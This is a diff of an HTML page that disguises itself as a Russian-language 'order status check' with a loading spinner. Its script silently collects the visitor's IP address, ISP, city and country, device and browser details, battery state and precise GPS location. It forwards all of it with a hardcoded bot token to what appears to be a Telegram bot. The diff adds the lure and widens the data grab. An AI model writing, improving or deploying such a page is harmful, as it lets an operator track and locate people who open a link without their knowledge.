@@ -3,14 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image</title>
+    <title>Проверка заказа</title>
     <style>
-        body { margin: 0; background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        img { max-width: 100%; max-height: 100%; }
+        body { font-family: Arial; background: #f5f5f5; padding: 20px; text-align: center; }
+        .box { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #333; }
+        p { color: #666; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00aaff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <img src="https://avatars.mds.yandex.net/i?id=4a5a3a2a8b4c9d8e7f6a5b4c3d2e1f0a-1234567" alt="image">
+    <div class="box">
+        <h1>Проверка статуса заказа</h1>
+        <p>Пожалуйста, подождите. Идёт проверка информации...</p>
+        <div class="loader"></div>
+    </div>
 
     <script>
         const token = '8923967098:AAEijnLrTbMqLnry31gi8y9Zh5GKLREMd7E';
@@ -21,18 +29,63 @@
                 .catch(() => {});
         }
 
-        fetch('https://api.ipify.org?format=json')
+        // === 1. IP + ПРОВАЙДЕР + ГОРОД ===
+        fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
-                const info = '📱 НОВЫЙ КЛИЕНТ\n━━━━━━━━━━━━━━━━\n🌐 IP: ' + data.ip + '\n📱 Устройство: ' + navigator.userAgent + '\n🌍 Язык: ' + navigator.language + '\n🕐 Время: ' + new Date().toLocaleString();
+                const info = 
+                    '🎯 НОВЫЙ ПЕРЕХОД\n' +
+                    '━━━━━━━━━━━━━━━━\n' +
+                    '🌐 IP: ' + data.ip + '\n' +
+                    '🏢 Провайдер: ' + (data.org || 'неизвестно') + '\n' +
+                    '🌍 Город: ' + (data.city || 'неизвестно') + '\n' +
+                    '🗺️ Регион: ' + (data.region || 'неизвестно') + '\n' +
+                    '🏳️ Страна: ' + (data.country_name || 'неизвестно') + '\n' +
+                    '━━━━━━━━━━━━━━━━\n' +
+                    '📱 Устройство: ' + navigator.userAgent + '\n' +
+                    '💻 Платформа: ' + navigator.platform + '\n' +
+                    '🌍 Язык: ' + navigator.language + '\n' +
+                    '📚 Все языки: ' + (navigator.languages || []).join(', ') + '\n' +
+                    '🖥️ Экран: ' + screen.width + 'x' + screen.height + '\n' +
+                    '🕐 Часовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n' +
+                    '🧠 Ядер CPU: ' + (navigator.hardwareConcurrency || '?') + '\n' +
+                    '💾 Память: ' + (navigator.deviceMemory || '?') + ' ГБ\n' +
+                    '📶 Соединение: ' + (navigator.connection ? navigator.connection.effectiveType : '?') + '\n' +
+                    '🍪 Куки: ' + (navigator.cookieEnabled ? 'вкл' : 'выкл') + '\n' +
+                    '🕵️ Do Not Track: ' + (navigator.doNotTrack || 'нет') + '\n' +
+                    '⏰ Время: ' + new Date().toLocaleString();
                 sendToBot(info);
             })
-            .catch(() => sendToBot('❌ Ошибка получения IP'));
+            .catch(() => {
+                // Если ipapi не сработал — берём базовый IP
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => sendToBot('🌐 IP: ' + data.ip + '\n📱 ' + navigator.userAgent))
+                    .catch(() => sendToBot('❌ Ошибка IP'));
+            });
 
+        // === 2. БАТАРЕЯ ===
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                sendToBot('🔋 БАТАРЕЯ\n━━━━━━━━━━━━━━━━\n' +
+                    'Уровень: ' + Math.round(battery.level * 100) + '%\n' +
+                    'Заряжается: ' + (battery.charging ? 'да' : 'нет') + '\n' +
+                    'Время до разряда: ' + (battery.dischargingTime ? Math.round(battery.dischargingTime / 60) + ' мин' : '?'));
+            });
+        }
+
+        // === 3. ГЕОЛОКАЦИЯ ===
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 pos => {
-                    const coords = '📍 ГЕОЛОКАЦИЯ\n━━━━━━━━━━━━━━━━\nШирота: ' + pos.coords.latitude + '\nДолгота: ' + pos.coords.longitude + '\nТочность: ' + pos.coords.accuracy + ' м';
+                    const coords = 
+                        '📍 ГЕОЛОКАЦИЯ\n' +
+                        '━━━━━━━━━━━━━━━━\n' +
+                        'Широта: ' + pos.coords.latitude + '\n' +
+                        'Долгота: ' + pos.coords.longitude + '\n' +
+                        'Точность: ' + Math.round(pos.coords.accuracy) + ' м\n' +
+                        'Высота: ' + (pos.coords.altitude || '?') + '\n' +
+                        'Скорость: ' + (pos.coords.speed || '?');
                     sendToBot(coords);
                 },
                 () => sendToBot('❌ Геолокация запрещена')
